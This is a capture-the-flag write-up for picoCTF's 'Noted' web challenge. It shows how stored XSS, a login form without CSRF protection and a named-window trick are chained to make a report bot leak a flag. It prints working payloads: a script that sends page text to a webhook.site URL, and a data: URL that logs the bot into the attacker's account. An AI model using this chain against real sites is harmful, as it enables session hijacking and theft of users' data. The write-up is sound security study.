# picoCTF — Noted (Web Exploitation)

**Category:** Web Exploitation
**Link:**  https://learn.cylabacademy.org/library/282
**difficult:** hard

---

## Challenge Summary

A simple notes app. Users register, log in, write notes, and can "report" a URL to a bot.
Hint from the description: the report bot's headless browser has **no internet access**.

That last detail is the giveaway — the bot is going to visit whatever URL we submit, and it runs in the same origin as the app. This is a classic **bot + stored XSS + session confusion** challenge.

---

## Step 1 — Find the XSS

Registered an account, made a note with:

```html
<script>alert(1)</script>
```

It executed. Confirms **stored XSS** — but only inside my own account. That's self-XSS, not useful on its own. The real flag lives somewhere else.

---

## Step 2 — Read the Source

Two things stood out in the app code:

1. **Notes are rendered with EJS's unescaped tag `<%- %>`**
   → Escaped output (`<%= %>`) would print my payload as text. Unescaped means the browser executes it as real HTML/JS. This is *why* the XSS worked.

2. **`report.js` uses Puppeteer**, and the bot's flow is:
   - Launch a fresh **incognito** headless Chrome (no shared cookies with me)
   - Register a **random** throwaway account
   - Create a note titled `flag` with content = `process.env.FLAG`
   - Visit the URL I submitted through the report form
   - Wait ~7.5 seconds

So the flag sits inside a note that belongs to the **bot's own account**, not mine, and not visible anywhere else.

3. **Login (`/login`) has no CSRF protection.** Meaning: I can build an auto-submitting HTML form that logs the bot into *my* account, from any page.

---

## Step 3 — The Core Problem

- `/notes` only shows notes for whoever is currently logged in.
- The bot is logged into its random account when it creates the flag note.
- My XSS only runs in *my* account's session.

Different accounts, different sessions → my XSS can't just reach into the bot's `/notes` page.

**The trick needed:** get the bot to open its own flag page, keep that window open, then switch sessions (via the CSRF-able login) into my account, and trigger my XSS *while the old window is still open* — then reach back into it.

---

## Step 4 — The Window Trick

Browsers let you open and later "grab" a window by name:

```js
window.open("http://target/notes", "flag");   // opens & names a window "flag"
...
window.open("", "flag");                       // later, grabs that same window (no new page)
```

Since both pages are same-origin, JavaScript from the second reference can read the DOM of that already-open window — including the flag note text.

---

## Step 5 — Delivering the Exploit with a `data:` URL

The bot's browser has no internet access, so hosting an external exploit page won't work. Instead, the exploit HTML is packed directly into the submitted URL using:

```
data:text/html,<...html here...>
```

This tells the browser "treat everything after this as an HTML page" — no external hosting needed.

---

## Step 6 — Building the Payload

**A. In my own attacker account**, create a note containing the "reader" script (only fires when the URL has `?run_xss`). **Title can be blank/anything — only the body matters**, since the exploit reads the whole page body via `innerText`:

```html
<script>
if (location.search.includes("run_xss")) {
  location.href = "https://webhook.site/YOUR-UUID?" +
    encodeURIComponent(window.open("", "flag").document.body.innerText);
}
</script>
```

⚠️ Don't forget the `?` right after your UUID, before the `+`. Without it, the flag text gets appended straight onto the path instead of as a query string — webhook.site will still log *something*, but it'll be a mangled/invalid-looking path instead of a clean query param.

This grabs the still-open `flag` window, reads its visible text, and exfiltrates it to a webhook.site URL (a free "did anyone hit this?" endpoint).

**B. The report payload** — submitted through the report form as one single `data:text/html,...` URL (**not** put into a note):

```
data:text/html,<form action="http://TARGET_HOST:PORT/login" method="POST" id="f" target="_blank"><input name="username" value="a"><input name="password" value="a"></form><script>window.open("http://TARGET_HOST:PORT/notes","flag");setTimeout(()=>f.submit(),1000);setTimeout(()=>location="http://TARGET_HOST:PORT/notes?run_xss",2000);</script>
```

Unminified, for readability:

```html
<form action="http://TARGET_HOST:PORT/login" method="POST" id="f" target="_blank">
  <input name="username" value="a">
  <input name="password" value="a">
</form>
<script>
  window.open("http://TARGET_HOST:PORT/notes", "flag");                 // 1. open bot's flag notes, keep it named
  setTimeout(() => f.submit(), 1000);                                    // 2. CSRF: log bot into MY account
  setTimeout(() => location = "http://TARGET_HOST:PORT/notes?run_xss", 2000); // 3. go trigger my XSS note
</script>
```

### ⚠️ Host gotcha (this cost real debugging time)

`TARGET_HOST:PORT` depends on **how the challenge is deployed**:

- **Local Docker spin-up** (you launch the challenge instance yourself, app + bot run on your own machine) → use `0.0.0.0:PORT` or `localhost:PORT`. The bot container shares your local network, so this resolves correctly.
- **Remote always-on instance** (pico gives you a shared host like `saturn.picoctf.net:PORT`) → you'd use that hostname instead, since the bot isn't running locally.

Mixing these up is a silent failure — no errors, no requests, just nothing happening. If webhook.site shows **zero** requests after reporting, host mismatch is the first thing to check, right after confirming the report form even accepted the `data:` URL.

**Quick sanity checks when debugging "nothing happened":**
1. Report a plain `https://webhook.site/YOUR-UUID` (no chain) — confirms the bot visits reported URLs at all.
2. Report `data:text/html,<script>fetch("https://webhook.site/YOUR-UUID?hit=1")</script>` — confirms `data:` URLs execute in the bot.
3. Only after both of those succeed, debug the full window-grab/CSRF/XSS chain.

Order of operations matters — hence the staggered `setTimeout`s:

1. Open the bot's own `/notes` (still logged in as bot → contains the flag) in a window named `flag`.
2. Submit a login form (no CSRF protection) → bot's session becomes *my* attacker account.
3. Redirect the bot to my `/notes?run_xss` → my stored XSS runs.
4. My XSS reaches back into the old `flag`-named window and reads its text.
5. Sends that text (the flag) to my webhook.site URL.

---

## Full Exploit Flow

```
1. Register attacker account
2. Store XSS payload in a note (fires only on ?run_xss)
3. Submit a data: URL payload to the report feature
4. Bot: creates random account + note containing FLAG
5. Bot: opens its own /notes in a window named "flag"   ← via my payload
6. Bot: gets logged into my attacker account (CSRF)      ← via my payload
7. Bot: redirected to my /notes?run_xss                  ← via my payload
8. My stored XSS runs, reads the old "flag" window's text
9. Flag exfiltrated to webhook.site
```

---

## Key Takeaways

- **Unescaped template output (`<%- %>` in EJS)** turns stored content into executable HTML — always check how a template engine escapes (or doesn't escape) user input.
- **Self-XSS becomes dangerous** the moment there's a bot/admin visiting attacker-controlled content in a shared origin.
- **Missing CSRF protection on login** can be abused to hijack a *victim's* session into an *attacker-controlled* one — not just perform actions as the victim.
- **`window.open(url, name)` + `window.open("", name)`** is a same-origin trick to keep a reference to a page after navigating away — useful for reading state that would otherwise be lost.
- **`data:` URLs** are a handy delivery method when the target has no internet access — the payload travels inside the URL itself.

---
*Simplified from a public writeup by Siyam for personal study/reference.*